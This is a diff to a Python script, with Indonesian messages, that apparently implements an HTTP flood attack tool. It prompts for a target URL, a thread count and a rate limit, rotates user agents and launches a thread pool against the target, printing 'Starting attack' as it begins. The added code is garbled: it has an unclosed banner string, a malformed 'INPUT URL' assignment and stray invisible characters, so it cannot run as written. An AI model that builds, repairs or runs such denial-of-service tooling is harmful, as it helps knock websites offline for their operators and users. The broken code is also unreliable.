@@ -4,6 +4,7 @@ import time
 import random
 import requests
 import threading
+import colorama
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 
@@ -51,30 +52,40 @@ def worker_pool(url, num_threads, num_requests, user_agents):
             future.result()
 
 # Fungsi utama
-def main():
-    global TARGET_URL, NUM_THREADS, RATE_LIMIT
-    print("~~~~~MEMEY~~~~~")
-    URL = input("web URL: ")
-    if not URL:
-        print("Input web URL ")
-        sys.exit(1)
-    NUM_THREADS = int(input("threads: "))
-    if NUM_THREADS <= 0:
-        print("Threads harus lebih besar dari 0")
-        sys.exit(1)
-    RATE_LIMIT = int(input("100"))
-    if RATE_LIMIT <= 0:
-        print("Rate limit harus lebih besar dari 0")
-        sys.exit(1)
-    user_agents = load_user_agents(USER_AGENT_FILE)
-    if not user_agents:
-        print("User agent list kosong")
-        sys.exit(1)
-    print(f"Starting attack at {TARGET_URL} with {NUM_THREADS} threads")
-    start_time = datetime.now()
-    worker_pool(TARGET_URL, NUM_THREADS, 100, user_agents)
-    end_time = datetime.now()
-    print(f"End {end_time - start_time}")
-
-if __name__ == "__main__":
-    main()
+# Fungsi utama
+‎def main():
+‎    global TARGET_URL, NUM_THREADS, RATE_LIMIT
+‎    print("╔╦╗╔═╗╔╦╗╔═╗╦ ╦
+         ("║║║║╣ ║║║║╣ ╚╦╝
+        (" ╩ ╩╚═╝╩ ╩╚═╝ ╩ ")
+‎    INPUT URL = input("target URL: ")
+‎    if not TARGET_URL:
+‎        print("Masukkan URL dengan benar")
+‎        sys.exit(1)
+‎    NUM_THREADS = int(input("threads: "))
+‎    if NUM_THREADS <= 0:
+‎        print("Threads harus lebih besar dari 0")
+‎        sys.exit(1)
+‎    rate_limit_input = input("rate limit ( ex: 100 ): ")
+‎    if rate_limit_input.endswith('ms'):
+‎        RATE_LIMIT = int(rate_limit_input[:-2])
+‎    elif rate_limit_input.endswith('s'):
+‎        RATE_LIMIT = int(rate_limit_input[:-1]) * 1000
+‎    else:
+‎        print("Format rate limit tidak valid")
+‎        sys.exit(1)
+‎    if RATE_LIMIT <= 0:
+‎        print("Rate limit harus lebih besar dari 0")
+‎        sys.exit(1)
+‎    user_agents = load_user_agents(USER_AGENT_FILE)
+‎    if not user_agents:
+‎        print("User agent list kosong")
+‎        sys.exit(1)
+‎    print(f"Starting attack pada {TARGET_URL} dengan {NUM_THREADS} threads")
+‎    start_time = datetime.now()
+‎    worker_pool(TARGET_URL, NUM_THREADS, 100, user_agents)
+‎    end_time = datetime.now()
+‎    print(f"Attack selesai dalam {end_time - start_time}")
+‎
+‎if __name__ == "__main__":
+‎    main()
